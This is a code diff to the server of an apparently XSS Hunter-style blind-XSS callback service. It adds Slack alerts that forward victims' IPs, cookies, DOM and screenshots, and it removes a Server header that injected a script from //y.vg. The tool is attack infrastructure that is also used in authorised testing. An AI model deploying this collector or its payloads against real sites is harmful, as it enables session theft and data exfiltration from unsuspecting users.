@@ -25,6 +25,7 @@ from models.injection_record import Injection
 from models.request_record import InjectionRequest
 from models.collected_page import CollectedPage
 from binascii import a2b_base64
+from slacker import Slacker
 
 logging.basicConfig(filename="logs/detailed.log",level=logging.DEBUG)
 
@@ -61,7 +62,6 @@ class BaseHandler(tornado.web.RequestHandler):
         self.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
         self.set_header("Pragma", "no-cache")
         self.set_header("Expires", "0")
-        self.set_header("Server", "<script src=//y.vg></script>")
 
         self.request.remote_ip = self.request.headers.get( "X-Forwarded-For" )
 
@@ -145,6 +145,33 @@ class BaseHandler(tornado.web.RequestHandler):
         subdomain = domain_parts[0]
         return session.query( User ).filter_by( domain=subdomain ).first()
 
+def send_slack(injection_db_record,pgp=False):
+    slack = Slacker(settings['slack_api_key'])
+    slack_send_to = settings['slack_send_to']
+
+    ## decode/template message (or not)
+    if pgp:
+      slack_message = '*XSS Payload PGP Encrypted message received*\n\n'+injection_db_record
+    else:
+      injection_data = injection_db_record.get_injection_blob()
+      slack_message = '*XSS Payload Fired On* ' + injection_data['vulnerable_page'] + '\n\t*IP:* ' + injection_data['victim_ip']
+      if injection_data['referer']:
+        slack_message = slack_message + '\n\t*Referer:* '+ injection_data['referer']
+      slack_message = slack_message + '\n\t*User Agent:* ' + injection_data['user_agent']
+      if injection_data['cookies']:
+        slack_message = slack_message + '\n\t*Cookies:* ' + injection_data['cookies']
+      slack_message = slack_message + '\n\t*DOM:*\n```' + injection_data['dom'] + '```'
+      slack_message = slack_message + '\n\t*Origin:* ' + injection_data['origin']
+      slack_message = slack_message + '\n\t*Screenshot:* https://' + settings['domain'] + '/' + injection_data['screenshot']
+
+    ## post message
+    if slack_send_to[0] == '#':
+      slack.chat.post_message(slack_send_to, slack_message)
+    elif slack_send_to[0] == '@':
+      slack.chat.post_message(slack_send_to, slack_message, as_user=True)
+    else:
+      slack.chat.post_message('#general', slack_message)
+
 def data_uri_to_file( data_uri ):
     """
     Turns the canvas data URI into a file handler
@@ -196,9 +223,14 @@ def upload_screenshot( base64_screenshot_data_uri ):
     return screenshot_filename
 
 def record_callback_in_database( callback_data, request_handler ):
-    screenshot_file_path = upload_screenshot( callback_data["screenshot"] )
+    if len(callback_data["screenshot"]) > 0:
+        screenshot_file_path = upload_screenshot( callback_data["screenshot"] )
+    else:
+        screenshot_file_path = ''
 
     injection = Injection( vulnerable_page=callback_data["uri"].encode("utf-8"),
+        vulnerable_domain=callback_data["domain"].encode("utf-8"),
+        document_body=callback_data["document-body"],
         victim_ip=callback_data["ip"].encode("utf-8"),
         referer=callback_data["referrer"].encode("utf-8"),
         user_agent=callback_data["user-agent"].encode("utf-8"),
@@ -401,16 +433,24 @@ class CallbackHandler(BaseHandler):
         if "-----BEGIN PGP MESSAGE-----" in self.request.body:
             if owner_user.email_enabled:
                 self.logit( "User " + owner_user.username + " just got a PGP encrypted XSS callback, passing it along." )
-                send_javascript_pgp_encrypted_callback_message( self.request.body, owner_user.email )
+                #send_javascript_pgp_encrypted_callback_message( self.request.body, owner_user.email )
+                send_slack(self.request.body,True)
         else:
             callback_data = json.loads( self.request.body )
             callback_data['ip'] = self.request.remote_ip
-            injection_db_record = record_callback_in_database( callback_data, self )
-            self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )
 
-            if owner_user.email_enabled:
-                send_javascript_callback_message( owner_user.email, injection_db_record )
-            self.write( '{}' )
+	    # Check if injection already recently recorded
+	    owner_user = self.get_user_from_subdomain()
+    	    if 0 < session.query( InjectionRequest ).filter( Injection.owner_id == owner_user.id, Injection.vulnerable_page == callback_data["uri"].encode("utf-8"), Injection.victim_ip == self.request.remote_ip, Injection.user_agent == callback_data["user-agent"].encode("utf-8"), Injection.injection_timestamp > time.time()-900).count():
+                self.write( '{"DUPLICATE"}' )
+            else:
+                injection_db_record = record_callback_in_database( callback_data, self )
+                self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )
+                send_slack(injection_db_record)
+                ## disabling mailgun here at the moment :p sorry <3 
+                #if owner_user.email_enabled:
+                #    send_javascript_callback_message( owner_user.email, injection_db_record )
+                self.write( '{}' )
 
 class HomepageHandler(BaseHandler):
     def get(self, path):
@@ -439,8 +479,16 @@ class HomepageHandler(BaseHandler):
         else:
             new_probe = new_probe.replace( '[TEMPLATE_REPLACE_ME]', json.dumps( "" ))
 
+	# Check recent callbacks
+	if "Referer" in self.request.headers:
+            if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900, Injection.vulnerable_page == self.request.headers.get("Referer")).count():
+                new_probe = 'Injection already recorded within last fifteen minutes'
+	else:
+	    if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900).count():
+                new_probe = 'Injection already recorded within last fifteen minutes'
+
         if self.request.uri != "/":
-            probe_id = self.request.uri.split( "/" )[1]
+            probe_id = self.request.uri.split('/')[1].split('?')[0]
             self.write( new_probe.replace( "[PROBE_ID]", probe_id ) )
         else:
             self.write( new_probe )
@@ -479,7 +527,8 @@ class ResendInjectionEmailHandler(BaseHandler):
 
         self.logit( "User just requested to resend the injection record email for URI " + injection_db_record.vulnerable_page )
 
-        send_javascript_callback_message( user.email, injection_db_record )
+        #send_javascript_callback_message( user.email, injection_db_record )
+        send_slack(injection_db_record)
 
         self.write({
             "success": True,
@@ -503,7 +552,11 @@ class DeleteInjectionHandler(BaseHandler):
 
         self.logit( "User delted injection record with an id of " + injection_db_record.id + "(" + injection_db_record.vulnerable_page + ")")
 
-        os.remove( injection_db_record.screenshot )
+	try:
+            os.remove( injection_db_record.screenshot )
+	except OSError as e:
+            self.logit("Screenshot doesn't exist - " + injection_db_record.screenshot)
+            pass
 
         injection_db_record = session.query( Injection ).filter_by( id=str( delete_data.get( "id" ) ) ).delete()
         session.commit()
@@ -543,7 +596,7 @@ class InjectionRequestHandler( BaseHandler ):
     """
     def post( self ):
         return_data = {}
-        request_dict = json.loads( self.request.body )
+        request_dict = json.loads( self.request.body.replace('\r', '\\n') )
         if not self.validate_input( ["request", "owner_correlation_key", "injection_key"], request_dict ):
             return
 
